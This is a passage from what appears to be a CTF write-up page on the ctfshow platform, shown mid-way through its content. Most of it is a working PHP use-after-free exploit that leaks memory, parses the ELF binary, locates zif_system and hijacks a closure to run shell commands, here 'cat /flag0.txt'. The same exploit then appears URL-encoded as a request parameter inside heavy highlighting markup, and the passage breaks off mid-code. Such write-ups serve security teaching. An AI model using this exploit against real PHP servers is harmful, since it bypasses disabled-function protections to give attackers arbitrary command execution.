leak($leak);                            if($deref != 0x786568326e6962)                  continue;          &#125; else continue;          return $data_addr + $i * 8;      &#125;  &#125;  function get_binary_base($binary_leak) &#123;      $base = 0;      $start = $binary_leak &amp; 0xfffffffffffff000;      for($i = 0; $i &lt; 0x1000; $i++) &#123;          $addr = $start - 0x1000 * $i;          $leak = leak($addr, 0, 7);          if($leak == 0x10102464c457f) &#123;              return $addr;          &#125;      &#125;  &#125;  function get_system($basic_funcs) &#123;      $addr = $basic_funcs;      do &#123;          $f_entry = leak($addr);          $f_name = leak($f_entry, 0, 6);          if($f_name == 0x6d6574737973) &#123;              return leak($addr + 8);          &#125;          $addr += 0x20;      &#125; while($f_entry != 0);      return false;  &#125;  function trigger_uaf($arg) &#123;      $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);      $vuln = new Vuln();      $vuln-&gt;a = $arg;  &#125;  if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;      die(&#39;This PoC is for *nix systems only.&#39;);  &#125;  $n_alloc = 10;   $contiguous = [];  for($i = 0; $i &lt; $n_alloc; $i++)      $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);  trigger_uaf(&#39;x&#39;);  $abc = $backtrace[1][&#39;args&#39;][0];  $helper = new Helper;  $helper-&gt;b = function ($x) &#123; &#125;;  if(strlen($abc) == 79 || strlen($abc) == 0) &#123;      die(&quot;UAF failed&quot;);  &#125;  $closure_handlers = str2ptr($abc, 0);  $php_heap = str2ptr($abc, 0x58);  $abc_addr = $php_heap - 0xc8;  write($abc, 0x60, 2);  write($abc, 0x70, 6);  write($abc, 0x10, $abc_addr + 0x60);  write($abc, 0x18, 0xa);  $closure_obj = str2ptr($abc, 0x20);  $binary_leak = leak($closure_handlers, 8);  if(!($base = get_binary_base($binary_leak))) &#123;      die(&quot;Couldn&#39;t determine binary base address&quot;);  &#125;  if(!($elf = parse_elf($base))) &#123;      die(&quot;Couldn&#39;t parse ELF header&quot;);  &#125;  if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;      die(&quot;Couldn&#39;t get basic_functions address&quot;);  &#125;  if(!($zif_system = get_system($basic_funcs))) &#123;      die(&quot;Couldn&#39;t get zif_system address&quot;);  &#125;  $fake_obj_offset = 0xd0;  for($i = 0; $i &lt; 0x110; $i += 8) &#123;      write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));  &#125;  write($abc, 0x20, $abc_addr + $fake_obj_offset);  write($abc, 0xd0 + 0x38, 1, 4);   write($abc, 0xd0 + 0x68, $zif_system);   ($helper-&gt;b)($cmd);  exit();</code></pre><p>  }</p><p>  ctfshow(“cat &#x2F;flag0.txt”);ob_end_flush();</p>  <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>- ```shell<br>  # 编码后的payload<br>  <span class="hljs-keyword">c</span><span class="hljs-operator">=</span>function<span class="hljs-variable">%20</span>ctfshow(<span class="hljs-variable">%24</span>cmd)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-keyword">global</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>helper<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>backtrace<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>class<span class="hljs-variable">%20</span>vuln<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>public<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>a<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>public<span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>__destruct()<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-keyword">global</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>backtrace<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>unset(<span class="hljs-variable">%24</span>this-<span class="hljs-variable">%3</span>ea)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>backtrace<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>(new<span class="hljs-variable">%20</span>exception)-<span class="hljs-variable">%3</span>egettrace()<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-title">!isset</span>(<span class="hljs-variable">%24</span>backtrace<span class="hljs-variable">%5</span>b<span class="hljs-number">1</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%5</span>b&#x27;args&#x27;<span class="hljs-variable">%5</span>d))<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>backtrace<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>debug_backtrace()<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>class<span class="hljs-variable">%20</span>helper<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>public<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>a<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>b<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>d<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>str<span class="hljs-number">2</span>ptr(<span class="hljs-variable">%26</span><span class="hljs-variable">%24</span>str<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>s<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>address<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for(<span class="hljs-variable">%24</span>j<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>s<span class="hljs-number">-1</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>j<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>j--)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>address<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>address<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-keyword">ord</span>(<span class="hljs-variable">%24</span>str<span class="hljs-variable">%5</span>b<span class="hljs-variable">%24</span>p<span class="hljs-variable">%2</span>b<span class="hljs-variable">%24</span>j<span class="hljs-variable">%5</span>d)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>address<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>ptr<span class="hljs-number">2</span>str(<span class="hljs-variable">%24</span>ptr<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>m<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>out<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for<span class="hljs-variable">%20</span>(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%3</span>d<span class="hljs-number">0</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>m<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%2</span>b<span class="hljs-variable">%2</span>b)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>out<span class="hljs-variable">%20</span>.<span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>sprintf(<span class="hljs-variable">%22</span><span class="hljs-variable">%25</span><span class="hljs-keyword">c</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span>(<span class="hljs-variable">%24</span>ptr<span class="hljs-variable">%20</span><span class="hljs-variable">%26</span><span class="hljs-variable">%200</span>xff))<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>ptr<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%3</span>e<span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>out<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>write(<span class="hljs-variable">%26</span><span class="hljs-variable">%24</span>str<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>v<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>n<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>n<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%2</span>b<span class="hljs-variable">%2</span>b)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>str<span class="hljs-variable">%5</span>b<span class="hljs-variable">%24</span>p<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%5</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>sprintf(<span class="hljs-variable">%22</span><span class="hljs-variable">%25</span><span class="hljs-keyword">c</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span>(<span class="hljs-variable">%24</span>v<span class="hljs-variable">%20</span><span class="hljs-variable">%26</span><span class="hljs-variable">%200</span>xff))<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>v<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%3</span>e<span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>addr<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>s<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-keyword">global</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>helper<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">68</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>addr<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p<span class="hljs-variable">%20</span>-<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">10</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>strlen(<span class="hljs-variable">%24</span>helper-<span class="hljs-variable">%3</span>ea)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>s<span class="hljs-variable">%20</span>!<span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%202</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span>(<span class="hljs-variable">%24</span>s<span class="hljs-variable">%20</span>*<span class="hljs-variable">%208</span>)<span class="hljs-variable">%20</span>-<span class="hljs-variable">%201</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>parse_elf(<span class="hljs-variable">%24</span>base)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_type<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>base<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">10</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%202</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_phoff<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>base<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">20</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_phentsize<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span 